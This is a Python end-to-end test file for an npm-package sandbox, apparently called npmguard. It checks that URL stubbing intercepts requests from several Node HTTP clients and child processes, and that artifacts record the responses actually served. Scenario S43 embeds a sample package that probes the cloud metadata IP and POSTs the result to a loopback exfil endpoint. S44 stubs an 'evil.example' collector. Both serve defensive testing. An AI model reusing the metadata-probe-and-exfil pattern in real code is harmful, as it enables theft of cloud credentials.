# SCENARIO MAP — the stubUrl primitive against a REAL sandbox: does the stub
# actually intercept, and does the sealed artifact record what was actually served?
#
# This tier exists because the defect it pins was invisible to every other one.
# `stubUrl` used to install itself by setting HTTP_PROXY/HTTPS_PROXY, which Node
# core's http/https ignore — and so does Node 22's global fetch/undici. The
# manipulation silently no-opped while `setupApplied.stubUrls[].responseHash`
# attested a canned response nobody served (explainer §24.0). Only a real container
# with a real client can falsify that. Note what CANNOT: the L1 strace shows
# `connect 127.0.0.1:9999` either way, because netfilter rewrites the destination
# after the connect syscall returns its argument. Interception is observable only
# from what the client RECEIVED and from the proxy's own ledger — which is why the
# ledger, not the plan, is what the artifact records.
#
# Every scenario has the package ECHO what it received back through a stubbed URL,
# so "the client received the canned response" is an assertion over the sealed
# artifact rather than over stdout (which the artifact keeps only as a hash).
#
# Axes: client library × where the client runs × pattern reachability × ledger truth
#   S38 core http to a stubbed URL receives the canned response
#   S39 global fetch (undici) — same, from a client sharing no code with core http
#   S40 a userland client with its own http.Agent — same
#   S41 a CHILD process with no instrument loaded — same (an in-process monkey patch
#       cannot cover this, and spawning a child is one line of hostile code)
#   S42 responseHash is the hash of the response the proxy WROTE (recomputed from
#       the plan, independently), and null for a stub nothing requested
#   S43 the running example's shape: loopback exfil + bare-IP IMDS in one
#       experiment, under the full oracle — both stubbed, artifact clean
#   S44 a stub that CANNOT apply (https) → SetupError naming the pattern + a
#       setup_bypass row in the timeline, and the run still executes
# Not covered here, deliberately: SetupError → DEFERRED → never SAFE is already
# enforced at the unit tier (test_orchestrator_errors C1–C3,
# test_orchestrator_success::test_deferred_never_aggregates_safe). This file proves
# the half those cannot — that the artifact carries the SetupError at all.

from __future__ import annotations

import hashlib
import json
from collections.abc import Mapping
from pathlib import Path

import pytest

from npmguard.config import Settings
from npmguard.contract.models import RunArtifact, ToolCall
from npmguard.evidence import render_timeline
from npmguard.observation import run_under_observation
from tests.support.optional import present

pytestmark = [pytest.mark.e2e, pytest.mark.docker]

# Loopback-only observation: a stubbed host is pinned to 127.0.0.1 by an --add-host
# entry, so no bridge network is needed and the run stays fast. S43 uses the full
# oracle on a bridge because a bare-IP target needs a route to exist at all — the
# output route lookup precedes the nat OUTPUT chain, so with --network=none a connect
# to 169.254.169.254 fails ENETUNREACH before netfilter ever sees it.
LOOPBACK_OBSERVE = {
    "kernel": False,
    "network": False,
    "fsDiff": False,
    "node": True,
    "inspector": False,
}
FULL_ORACLE = {"kernel": True, "network": True, "fsDiff": True, "node": True, "inspector": True}
BUDGET = {"wallMs": 30_000}

# `.invalid` is guaranteed never to resolve (RFC 6761), so a request to this host can
# only succeed via the /etc/hosts pin the stub installs. That makes every green
# assertion below evidence of interception rather than of a lucky real endpoint.
STUB_HOST = "collector.npmguard-test.invalid"
STUB_URL = f"http://{STUB_HOST}/collect"
ECHO_PREFIX = f"http://{STUB_HOST}/echo/"
STUB_BODY = "STUBBED-BODY-7f3a"
PLAIN_HEADERS = {"Content-Type": "text/plain"}

# The package under test reports what it received by requesting a stubbed echo URL:
# the L4 sensor records the requested URL verbatim, so the received value lands in
# the sealed artifact. Concatenation only, no encoding — the values are URL-safe.
ECHO_JS = f"""
const _http = require('http');
function echo(value) {{
  _http.get({json.dumps(ECHO_PREFIX)} + value, (r) => r.resume()).on('error', () => {{}});
}}
"""


def expected_response_hash(status: int, headers: dict[str, str], body: str) -> str:
    """Recompute, from the PLAN, the hash stub-proxy.js records for a response it
    wrote. Deliberately a second implementation: equality proves the proxy served the
    canned response and nothing else, and a drift between the two shows up as a red
    test rather than as an artifact nobody can verify."""
    return hashlib.sha256(
        json.dumps(
            {"status": status, "body": body, "headers": headers}, separators=(",", ":")
        ).encode()
    ).hexdigest()


def stub_call(*patterns: str, body: str = STUB_BODY, status: int = 200) -> ToolCall:
    return ToolCall(
        tool="stubUrl",
        args={
            "stubs": [
                {
                    "pattern": pattern,
                    "responseStatus": status,
                    "responseBody": body,
                    "responseHeaders": PLAIN_HEADERS,
                }
                for pattern in patterns
            ]
        },
    )


def echoing_stub(*extra: str) -> ToolCall:
    return stub_call(STUB_URL, f"{ECHO_PREFIX}*", *extra)


async def run_package(
    tmp_path: Path,
    source: str,
    *calls: ToolCall,
    observe: dict | None = None,
    files: Mapping[str, str] | None = None,
) -> RunArtifact:
    """Run `source` as index.js in a real sandbox container under the given setup.
    Extra files use `__` for a path separator (node_modules__x__index.js)."""
    package = tmp_path / "pkg"
    package.mkdir(exist_ok=True)
    (package / "package.json").write_text(json.dumps({"name": "stub-probe", "version": "1.0.0"}))
    (package / "index.js").write_text(ECHO_JS + source)
    for name, content in (files or {}).items():
        target = package / name.replace("__", "/")
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content)
    return await run_under_observation(
        package,
        [*calls, ToolCall(tool="trigger", args={"kind": "entrypoint", "target": "index.js"})],
        Settings(_env_file=None),
        observe=observe or LOOPBACK_OBSERVE,
        budget=BUDGET,
    )


def received(artifact: RunArtifact) -> list[str]:
    """What the package reported receiving, read off its echo requests."""
    return [
        (event.normalized or {})["url"].split(ECHO_PREFIX, 1)[1]
        for event in artifact.events
        if event.kind == "network" and ECHO_PREFIX in (event.normalized or {}).get("url", "")
    ]


def served_hash(artifact: RunArtifact, pattern: str) -> str | None:
    return next(ref.responseHash for ref in present(artifact.setupApplied.stubUrls) if ref.pattern == pattern)


async def test_s38_core_http_receives_the_canned_response(tmp_path) -> None:
    """S38 [C4]: a core `http.request` POST to a stubbed URL is answered by the stub.
    This is the scenario that fails on the old implementation — core http never reads
    HTTP_PROXY, so the request went to the real endpoint, which here cannot exist at
    all. Only the /etc/hosts pin plus the netfilter redirect can produce a 200."""
    artifact = await run_package(
        tmp_path,
        f"""
        const req = _http.request({json.dumps(STUB_URL)}, {{ method: 'POST' }}, (res) => {{
          let body = '';
          res.on('data', (chunk) => body += chunk);
          res.on('end', () => echo(res.statusCode + ':' + body));
        }});
        req.on('error', (e) => echo('ERROR-' + e.code));
        req.end('payload');
        """,
        echoing_stub(),
    )
    assert artifact.error is None, artifact.error
    assert received(artifact) == [f"200:{STUB_BODY}"]
    assert served_hash(artifact, STUB_URL) == expected_response_hash(200, PLAIN_HEADERS, STUB_BODY)
    # the authority the package asked for is what the timeline records, port and all
    assert f"POST {STUB_URL}" in render_timeline(artifact).text


async def test_s39_global_fetch_receives_the_canned_response(tmp_path) -> None:
    """S39 [C4]: undici shares no request path with core http — it opens its own
    socket — and in Node 22 it does not honour proxy env vars either. A redirect in
    the network namespace is below both."""
    artifact = await run_package(
        tmp_path,
        f"""
        fetch({json.dumps(STUB_URL)}, {{ method: 'POST', body: 'payload' }})
          .then(async (res) => echo(res.status + ':' + await res.text()))
          .catch((e) => echo('ERROR-' + (e.cause ? e.cause.code : e.message)));
        """,
        echoing_stub(),
    )
    assert artifact.error is None, artifact.error
    assert received(artifact) == [f"200:{STUB_BODY}"]
    assert served_hash(artifact, STUB_URL) == expected_response_hash(200, PLAIN_HEADERS, STUB_BODY)


async def test_s40_a_userland_client_with_its_own_agent_is_intercepted(tmp_path) -> None:
    """S40 [C4]: the shape a userland library takes — its own http.Agent, keep-alive,
    no proxy handling of its own. Vendored rather than installed so the proof is
    hermetic (no registry, no network, no version drift)."""
    artifact = await run_package(
        tmp_path,
        f"""
        const client = require('tiny-client');
        client.post({json.dumps(STUB_URL)}, 'payload', (err, status, body) => {{
          echo(err ? 'ERROR-' + err.code : status + ':' + body);
        }});
        """,
        echoing_stub(),
        files={
            "node_modules__tiny-client__package.json": json.dumps(
                {"name": "tiny-client", "version": "1.0.0", "main": "index.js"}
            ),
            "node_modules__tiny-client__index.js": """
        const http = require('http');
        const agent = new http.Agent({ keepAlive: true, maxSockets: 4 });
        exports.post = function (url, payload, done) {
          const target = new URL(url);
          const request = http.request(
            { agent, hostname: target.hostname, port: target.port || 80,
              path: target.pathname, method: 'POST' },
            (response) => {
              let body = '';
              response.on('data', (chunk) => body += chunk);
              response.on('end', () => done(null, response.statusCode, body));
            });
          request.on('error', done);
          request.end(payload);
        };
        """,
        },
    )
    assert artifact.error is None, artifact.error
    assert received(artifact) == [f"200:{STUB_BODY}"]
    assert served_hash(artifact, STUB_URL) == expected_response_hash(200, PLAIN_HEADERS, STUB_BODY)


async def test_s41_a_child_process_without_the_instrument_is_intercepted(tmp_path) -> None:
    """S41 [C4]: the scenario that decides the mechanism. The L4 instrument is loaded
    by `--require` on the trigger's command line only, so a child `node` carries none
    of its patches — interception living in the instrument is bypassed by one
    execFileSync. A netfilter rule is inherited by every process in the namespace, so
    the child is stubbed too; the parent echoes what the child reported."""
    child = (
        "require('http').get(" + json.dumps(STUB_URL) + ", (r) => {"
        "let b = ''; r.on('data', (c) => b += c);"
        "r.on('end', () => process.stdout.write(r.statusCode + ':' + b));"
        "}).on('error', (e) => process.stdout.write('ERROR-' + e.code))"
    )
    artifact = await run_package(
        tmp_path,
        f"""
        const out = require('child_process').execFileSync(
          'node', ['-e', {json.dumps(child)}], {{ encoding: 'utf8' }}).trim();
        echo(out);
        """,
        echoing_stub(),
    )
    assert artifact.error is None, artifact.error
    assert received(artifact) == [f"200:{STUB_BODY}"]
    assert served_hash(artifact, STUB_URL) == expected_response_hash(200, PLAIN_HEADERS, STUB_BODY)


async def test_s42_response_hash_is_what_was_served_and_null_when_nothing_was(tmp_path) -> None:
    """S42 [C4]: two stubs, one requested TWICE and one not. The requested one carries
    the hash of the bytes the proxy wrote — a non-default status, body and header, so a
    hash that merely restated the plan's defaults could not match — collapsed from both
    ledger rows (the observer asserts a stub's responses are identical rather than
    picking one), and the untouched one carries null, which the timeline names. Under
    the old code BOTH carried a hash and the artifact attested a response nobody
    served."""
    other = f"http://{STUB_HOST}/never-requested"
    artifact = await run_package(
        tmp_path,
        f"""
        function post(tag) {{
          const req = _http.request({json.dumps(STUB_URL)}, {{ method: 'POST' }}, (res) => {{
            let body = '';
            res.on('data', (chunk) => body += chunk);
            res.on('end', () => echo(tag + '-' + res.statusCode + ':' + body));
          }});
          req.on('error', (e) => echo(tag + '-ERROR-' + e.code));
          req.end('payload');
        }}
        post('first');
        post('second');
        """,
        ToolCall(
            tool="stubUrl",
            args={
                "stubs": [
                    {
                        "pattern": STUB_URL,
                        "responseStatus": 418,
                        "responseBody": "SERVED-418",
                        "responseHeaders": {"X-Stub": "yes"},
                    },
                    {"pattern": other, "responseStatus": 200, "responseBody": "unused"},
                    {
                        "pattern": f"{ECHO_PREFIX}*",
                        "responseStatus": 200,
                        "responseBody": STUB_BODY,
                        "responseHeaders": PLAIN_HEADERS,
                    },
                ]
            },
        ),
    )
    assert artifact.error is None, artifact.error
    assert sorted(received(artifact)) == ["first-418:SERVED-418", "second-418:SERVED-418"]
    assert served_hash(artifact, STUB_URL) == expected_response_hash(
        418, {"X-Stub": "yes"}, "SERVED-418"
    )
    assert served_hash(artifact, other) is None
    assert f"stubs never served: {other}" in render_timeline(artifact).text


async def test_s43_running_example_shape_under_the_full_oracle(tmp_path) -> None:
    """S43 [C4]: hyp-0008's own setup — an IMDS probe on a bare link-local IP and a
    loopback exfil POST on a non-default port — stubbed together under every sensor.
    The recorded L1 for that run reads `connect(19, 127.0.0.1:9999) = -1`: the package
    reached its real endpoint and the proxy was never contacted. Both stubs serve now,
    and the sealed record says so for each."""
    imds = "http://169.254.169.254/latest/meta-data/*"
    exfil = "http://localhost:9999/exfil"
    artifact = await run_package(
        tmp_path,
        """
        _http.get('http://169.254.169.254/latest/meta-data/', (res) => {
          let body = '';
          res.on('data', (chunk) => body += chunk);
          res.on('end', () => {
            const req = _http.request({ hostname: 'localhost', port: 9999, path: '/exfil',
              method: 'POST' }, (r) => {
                let out = '';
                r.on('data', (c) => out += c);
                r.on('end', () => echo(body + '+' + out));
              });
            req.on('error', (e) => echo('EXFIL-ERROR-' + e.code));
            req.end(JSON.stringify({ imds: body }));
          });
        }).on('error', (e) => echo('IMDS-ERROR-' + e.code));
        """,
        stub_call(imds, exfil, f"{ECHO_PREFIX}*"),
        observe=FULL_ORACLE,
    )
    assert artifact.error is None, artifact.error
    digest = expected_response_hash(200, PLAIN_HEADERS, STUB_BODY)
    assert served_hash(artifact, imds) == digest
    assert served_hash(artifact, exfil) == digest
    assert received(artifact) == [f"{STUB_BODY}+{STUB_BODY}"]
    text = render_timeline(artifact).text
    assert "never served" not in text and "bypass" not in text


async def test_s44_an_unstubbable_pattern_is_a_located_setup_error(tmp_path) -> None:
    """S44 [C3/C14]: an https pattern cannot be intercepted without a MitM CA the
    sandbox deliberately does not ship. The run still happens — its evidence can
    still CONFIRM — but the artifact carries a SetupError naming the pattern, which
    the orchestrator can only turn into DEFERRED, never REFUTED. Silently doing
    nothing here is exactly how a coverage gap used to reach SAFE."""
    artifact = await run_package(
        tmp_path,
        """
        echo('ran');
        """,
        stub_call("https://evil.example/collect", f"{ECHO_PREFIX}*"),
    )
    assert artifact.error is not None
    assert artifact.error.kind == "SetupError"
    assert "https://evil.example/collect" in artifact.error.detail
    assert "cannot be intercepted" in artifact.error.detail
    # the trigger was NOT blocked by the gap: the run executed and was observed
    assert artifact.exitCode == 0
    assert received(artifact) == ["ran"]
    text = render_timeline(artifact).text
    assert "bypass   stubUrl pattern 'https://evil.example/collect' cannot be intercepted" in text
    assert served_hash(artifact, "https://evil.example/collect") is None
